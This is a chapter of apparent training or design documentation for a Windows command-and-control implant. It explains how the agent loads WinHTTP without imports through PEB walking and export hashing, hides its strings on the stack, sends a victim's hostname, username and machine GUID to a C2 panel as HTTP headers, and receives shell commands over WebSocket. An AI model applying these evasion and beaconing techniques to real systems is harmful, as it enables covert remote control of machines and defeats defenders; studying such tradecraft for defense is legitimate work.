# Transport and Identity: Getting on the Wire Without a Network Stack

The agent speaks WebSocket over WinHTTP — a DLL it never imports,
loaded on demand, driven through a table of function pointers. And the
very first HTTP request it makes doubles as its introduction to the C2
panel. This chapter covers both.

**Primary source files:**
- `src/winhttp_api.cc` + `include/winhttp_api.h` — the runtime table
- `src/transport.cc` + `include/transport.h` — send / receive framing
- `src/main.cc` `run_session()` — the connect sequence

---

## 1. WinHTTP Without Imports

`WINHTTP_API` is a struct of 12 function pointers covering the whole
WebSocket client lifecycle: `WinHttpOpen` (session) → `WinHttpConnect`
(host) → `WinHttpOpenRequest` (the GET) → `WinHttpSetOption`
(UPGRADE_TO_WEB_SOCKET) → `WinHttpSendRequest` →
`WinHttpReceiveResponse` → `WinHttpWebSocketCompleteUpgrade` (socket!)
→ `WinHttpWebSocketSend/Receive` → `WinHttpCloseHandle`.

`WINHTTP_API_Ctor(&api)` fills it:

1. `GetModuleHandleFromPEB(HASH_MOD_WINHTTP)` — maybe winhttp is
   already loaded by the host.
2. If not: resolve `ntdll!LdrLoadDll` (ntdll is always mapped — it IS
   the loader), build `L"winhttp.dll"` on the stack (`BuildWinHttpDllName`,
   [04](04-stack-strings.md)), and hand the `UNICODE_STRING` to
   `LdrLoadDll` — exactly what the OS loader would do for an import.
3. Resolve every member by export hash; all-or-nothing like the other
   tables ([03](03-peb-hash-resolution.md) §6).

Why not import it like a normal program? The empty import table is the
project's headline property: nothing about the binary declares its
intent, and the loader does no work on its behalf.

## 2. The Connect Sequence (run_session, stage by stage)

```
URL (wide, from env)
   │ WinHttpCrackUrl
   ▼
scheme, host, port, path          validated: only http/https
   │ WinHttpOpen("minimal_agent/1.0")      ← stack-built UA
   │ WinHttpConnect(host, port)
   │ WinHttpOpenRequest("GET", path)       ← stack-built verb
   │ WinHttpSetOption(UPGRADE_TO_WEB_SOCKET)   ← no buffer: NULL,0
   │ build_identity_headers()              ← the introduction (§3)
   │ WinHttpSendRequest(headers...)        ← length in CHARACTERS (§4)
   │ WinHttpReceiveResponse                ← the 101 lands here
   │ WinHttpWebSocketCompleteUpgrade       ← request handle dies,
   ▼                                         socket handle is born
serve loop (chapter 06)
```

All four handles (session, connection, request, socket) are released on
every exit path via a `cleanup:` label — a dropped connection must not
leak handles across redials.

## 3. The Identity Block

The agent's entire self-introduction rides the upgrade request as HTTP
headers — there is no Hello command, no identity frame on the wire
after connect. The relay copies the headers into its events; the C2
registers the agent **only** if `X-Agent-Api-Version: 1` and a parseable
`X-Agent-Machine-Uuid` arrive. Without them the agent connects fine and
remains invisible to the panel forever — a failure mode this project
lived through.

`Handle_IdentityHeaders()` in `commands.c` writes the block
into a caller buffer (900 bytes) through a tiny checked-writer:

```
X-Agent-Api-Version: 1                ← required; gates C2 registration
X-Agent-Name-Id: 4                    ← breed id (this agent's own)
X-Agent-Platform: windows             ← required
X-Agent-Capabilities: 0100000000000000 ← bit 0 = Shell (16 hex chars)
X-Agent-Machine-Uuid: <registry GUID> ← THE persistent key (optional
                                         at the wire level, but the C2
                                         registers nothing without it)
X-Agent-Hostname: <GetComputerNameA>
X-Agent-Username: <GetUserNameA>
X-Agent-Arch: x86_64                   ← compile-time, with…
X-Agent-Process-Arch: x86_64          ← …the process bitness
X-Agent-Os-Version: <RtlGetVersion>   ← the honest one (no manifest lie)
X-Agent-Build: <ID_BUILD_NUMBER>      ← CI bakes the commit count
X-Agent-Commit: course01              ← CI bakes the short hash
```

Every fixed line and label is a stack-string builder
([04](04-stack-strings.md)); only the dynamic values (GUID, hostname…)
are plain ASCII appended at runtime — they come from OS APIs into
buffers, never from the binary.

## 4. The WebSocket Pipe (transport.cc)

A function, deliberately narrow:

**`WebSocketReceive(api, socket, &msg, &closed)`** — assembles one logical
message from however many fragments WinHTTP hands over:

```c
typedef struct {
    unsigned char data[MAX_MESSAGE_SIZE];   // 64 KB
    DWORD length;
    BOOL truncated;                          // overflowed: refuse whole
    WINHTTP_WEB_SOCKET_BUFFER_TYPE type;
} incoming_message;
```

- A close frame sets `*closed` — a normal event, not an error; the
  caller redials.
- Fragments accumulate until a `*_MESSAGE_BUFFER_TYPE` arrives.
- If the total would exceed `MAX_MESSAGE_SIZE`, the message is marked
  `truncated` and the **serve loop refuses to execute it** — running
  the head of an oversized command would mean executing half a command
  (imagine half a shell write).

## 6.Logging

`logger.cc` provides the `LOG_INFO` and `LOG_ERROR` output.
Release builds compile these macros away. Diagnostic output is written
through the resolved kernel32 output API and is absent from release
behavior.

## Next

Connected and introduced, the agent enters its serve loop: read one
command frame, dispatch, reply, repeat. The command language — with its
correlation-id framing — is the next chapter:
[06 - Command Protocol](06-command-protocol.md).
